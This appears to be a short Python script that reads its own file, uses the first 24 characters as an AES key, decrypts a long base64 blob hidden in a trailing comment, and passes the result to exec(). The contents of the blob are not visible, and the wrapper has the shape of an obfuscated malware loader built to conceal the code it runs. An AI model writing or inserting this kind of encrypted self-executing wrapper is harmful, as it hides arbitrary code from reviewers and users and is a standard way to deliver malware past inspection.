import base64, sys, os, __main__; from Crypto import Random; from Crypto.Cipher import AES; from io import StringIO
e = AES.new(open(__main__.__file__, 'r').read(24), AES.MODE_CFB, Random.new().read(AES.block_size)).decrypt(base64.b64decode(open(__main__.__file__, 'r').readlines()[-2][1:]))[16:]
print(e); exec(e)
#IdeoAFnkwd8ozjgq+oyPdEF1rnBAufcvse+lotJJ0TQVYgudYfvQVIjw5V8PBNNSWqfrT0CYjvekoTgu8kiJ+wW8e9mSFqt6xjKs0gq4AvGZy+djrqXgWJqpUWdeHFQH8Lzva9aPubao29uLZbj2CgU24qdzIDW9GUlMsaylwJCOtaudDF6HwR5JHLVco40pWwbkPp8ZRxZSOn7pIR18yTdHataB9bo7dl6zDhDX6WSvhT0xbX79b0SkNK1/YjMErkQo87xY2nY1ELpDILIRhW2x0Y6jiVwCYYXcH3ZXN9Tz6KT6/LwcxD9zhLQQ1teyn2VhA5w5PYgth+JmfY/Y+xMY/7wLRXfI5YrNV7mkCKr5RMgepuUAa37sUhi7PoRUWU2A5RKbic7oYnWGzDyAMCxYTvovt4hNfM9X66zuEST+fViC0LbU3vngUGW4EDpA3ylwcTxktnKVq4tvKmD34zIqGepWzQ4HX5W8N/JfDUMg8IJBYVSlW/MIZOIpKbJhng8U7pSKfaI98r1v8OtadmOE/nlQSAv8g88NImZo0Vp0GDrPkNgIaIB6DWJ8tD8Uesmxc9Y6P5dO8UM2plYTlbOn2Ahg0tea7CguRYLoWabxcwCAkS1hD/L2RrMWPA44wpUO4OdtFsK1EMHedFvxNDUtKlDkcSgEPgKtYExOv2TSiZpzcUi48dCvWMrsStV8sukoRJXh7foG8oBCpYk+yZxpZ/NkvG106ov6+6uPWd0DWqnouzasnJ6SsuaaslUiiyOuv38lpYXwbimQKWsDWwKgP+UpG1yY8ae/mhRVKWazx9/ZPU9xD6ESxMlA5C1gC8GQNiQXC6VQSXYokP+RFY1K6jUMtBqQt4rJNFLrGaw/DIibweaX0jMdzlHYs8IrZOpj8Wz8oTgOn7qQ7PoEtnCZ6y2aO6avhqFwCq5kFKTeEBmiF1ZMcpxexXMr/aJtRMB2bY78LEamcY9HpJ7czDRlpH4Fpq0BWxvockF5CkFrFUabI8ygjjTv64GzufZ7rcUtQBiKcaOBLyAPmKsXYx44rz6DsNu+kbFvA0tsnLg4EL6snjhXNin6fbfgaUWRPVvQJojCA8C1vEgx+bHEDk1ozOnu4JEwFJeU3uUz+YddbOI36GAHzOO8a6iW+2GPX5PDNOurtfPEdunvvBIrKShy+OVEHlYGhiVLneQbUMdrTTf2EWJPx4+O0U23o2is1pO5ZJyr4R/lyrOl0jgnTgg8c3zhZ1GfVZNSTjqh6b1vEALSAsPLXPeoz26ERKRSWeKeTwTizKJ4MZcsjqEbyvHIT8pL5TeITwWOcAtjaT1vjEgMFwNcNufskQUJJQqbSztLQtNu6FBxImxhylZ1N1o5dt7AHFfOUb35a6/kUVzVQsLDpNXiXLGCHMoMDXuCi+lgCTbkPDfQyYHJyA8z0NY1e+uq+0NE4SnnmsKGbM7eWuHRmM4z5FZzE/GS6QHiu4k2aN1sAnJs9bdGtZiSg8IX/Q2Fd317nxacPaTo/gWmedIw9PMnDvGU5kuZRokkeM0I9sGSYIs7ThvaEVQS59UTzUqXt7H2InxW64OaO6DIIZ+PMm9fHRGusz7ZlxJrCNtMuq9Kg2/3SU2HmMLC+EXwavElDoOGgwIELiL7vC7ajY+WK0JgLD/l/6aUsrV1uDBHdmosom4qqZA+ixWsEJRN5fIPFBV1TaErpxvCTC93hId5+igxPYMsYRXIfEfsbvVGM/fqGDmIC1D+M4kMyeHzykaHgM/0eBAiCMtMu88zct/NCz8RTrOzbQ/NsC3x35VLSJCTryrFTNEiLlrU2Eui76LMCVpgRdy9mfLNw+Ey9rE4N2tu+U84PRJFPZfJcTM35JrKq61A+ySKPTSm8Hw9TilV2iheeKHWF0iNzIf/Yhc1Eoco2KvVLT+0BsyeSx8Vx8zxRqbZgDW1XYcexxFBBF6IepQx55qDr6JI7icm5+a3GQ9g59YhqFNitczPmG03hxym92X6XFxfgyXy7bMIaA4nGhc4tCvsR1Vq/eO7592tC8v/LkuSorpdIxTEodWTIKCFT0AYr5hh6rhxvwTd8SZe7NqN+dFMP4a5IdjgrGzqKf4U4TzG4Tycw3WTow2n3pNtsDEqluqxCGBAlGk/wO5OmAJ4dyUtm19rIhcw